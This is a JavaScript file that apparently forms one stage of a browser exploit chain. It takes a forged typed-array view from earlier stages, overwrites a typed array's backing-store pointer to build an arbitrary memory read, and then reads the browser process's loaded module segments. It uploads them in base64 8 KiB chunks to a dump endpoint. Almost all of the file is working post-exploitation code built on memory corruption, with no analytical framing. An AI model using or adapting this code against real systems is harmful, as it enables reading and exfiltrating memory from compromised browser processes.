// Upload at most two 8 KiB chunks from measured browser module mappings.
// This is a transport canary for the authenticated binary dump endpoint.
var result, phase="preflight";
try {
  var state=window.__fw14ArrayState, n=window.__fw14NativeInvoke;
  var census=window.__fw14BulkModules, vm=window.__fw14BulkMap;
  if (!state || !state.view || !state.array || !state.a ||
      !state.ownedTypedView || !Number.isSafeInteger(state.calibratedViewBase) ||
      !n || !census || !vm || !api || !api.uploadChunkSync)
    throw new Error("bulk_plan_missing");
  var pid=n.call("getpid",[]);
  if (pid.high!==0 || pid.value!==census.pid || pid.value!==vm.pid ||
      state.array[0]!==state.a)
    throw new Error("page_identity_changed");
  var carrier=state.ownedTypedView, forged=state.view;
  if (carrier.length!==65536 || carrier[0]!==0x31 || carrier[7]!==0xa8)
    throw new Error("carrier_canary_changed");
  function bytesAt(index,count) {
    var out=[];
    for (var i=0;i<count;i++) out.push(forged[index+i]);
    return out;
  }
  function valueOf(bytes) {
    var v=0;
    for (var i=bytes.length-1;i>=0;i--) v=v*256+bytes[i];
    return v;
  }
  function pointerBytes(v) {
    var out=[];
    for (var i=0;i<8;i++) out.push(Math.floor(v/Math.pow(2,8*i))&255);
    return out;
  }
  function same(a,b) {
    if (a.length!==b.length) return false;
    for (var i=0;i<a.length;i++) if (a[i]!==b[i]) return false;
    return true;
  }
  var objectWord;
  try {
    state.array[0]=carrier;
    objectWord=valueOf(bytesAt(state.index,8));
  } finally {state.array[0]=state.a;}
  var slot=objectWord-state.calibratedViewBase+8;
  if (!Number.isSafeInteger(slot) || slot<0 || slot+8>=16777216)
    throw new Error("carrier_slot_outside_view");
  var original=bytesAt(slot,8);
  function readAt(address,count) {
    var pointer=pointerBytes(address);
    try {
      for (var i=0;i<8;i++) forged[slot+i]=pointer[i];
      var bytes=[];
      for (var j=0;j<count;j++) bytes.push(carrier[j]);
      return bytes;
    } finally {
      for (var k=0;k<8;k++) forged[slot+k]=original[k];
    }
  }
  var segments=[];
  for (var m=0;m<vm.modules.length;m++)
    for (var s=0;s<vm.modules[m].segments.length;s++)
      segments.push({handle:vm.modules[m].handle,
        name:vm.modules[m].name,segment:vm.modules[m].segments[s]});
  if (!segments.length) throw new Error("no_measured_segments");
  var cursor=window.__fw14BulkCursor;
  if (!cursor) cursor={index:0,offset:0};
  if (!Number.isInteger(cursor.index) || cursor.index<0 ||
      cursor.index>segments.length || !Number.isInteger(cursor.offset) ||
      cursor.offset<0) throw new Error("cursor_invalid");
  var uploaded=0,bytesUploaded=0,lastHandle=-1,lastKind="";
  if (api.markSync) api.markSync("bulk_dump_before");
  phase="chunk_upload";
  while (uploaded<2 && cursor.index<segments.length) {
    var target=segments[cursor.index], seg=target.segment;
    if (cursor.offset>=seg.size) {
      if (cursor.offset!==seg.size) throw new Error("cursor_past_segment");
      cursor.index++; cursor.offset=0; continue;
    }
    var length=Math.min(8192,seg.size-cursor.offset);
    var data=readAt(seg.start+cursor.offset,length);
    if (!same(bytesAt(slot,8),original) || state.array[0]!==state.a)
      throw new Error("carrier_pointer_not_restored");
    var binary="";
    for (var b=0;b<data.length;b++) binary+=String.fromCharCode(data[b]);
    var receipt=api.uploadChunkSync({pid:pid.value,
      module_handle:target.handle,segment_kind:seg.kind,
      range_start:seg.start,range_size:seg.size,offset:cursor.offset,
      data_b64:btoa(binary)});
    if (!receipt || receipt.bytes!==length ||
        typeof receipt.sha256!=="string" || receipt.sha256.length!==64)
      throw new Error("chunk_receipt_invalid");
    uploaded++; bytesUploaded+=length;
    lastHandle=target.handle; lastKind=seg.kind;
    cursor.offset+=length;
    if (cursor.offset===seg.size) {cursor.index++; cursor.offset=0;}
    window.__fw14BulkCursor=cursor;
  }
  var restored=same(bytesAt(slot,8),original) &&
    carrier[0]===0x31 && carrier[7]===0xa8 && state.array[0]===state.a;
  var pidAfter=n.call("getpid",[]);
  if (api.markSync) api.markSync("bulk_dump_done");
  result={id:"bulk_dump_v1",
    status:restored && pidAfter.value===pid.value && pidAfter.high===0?
      "pass":"fail",
    details:{pid:pid.value,uploaded:uploaded,bytes:bytesUploaded,
      segment_index:cursor.index,segment_offset:cursor.offset,
      segment_total:segments.length,done:cursor.index===segments.length,
      last_handle:lastHandle,last_kind:lastKind,restored:restored}};
} catch(error) {
  result={id:"bulk_dump_v1",status:"error",
    details:{phase:phase,error:String(error).slice(0,180)}};
}
return [result];
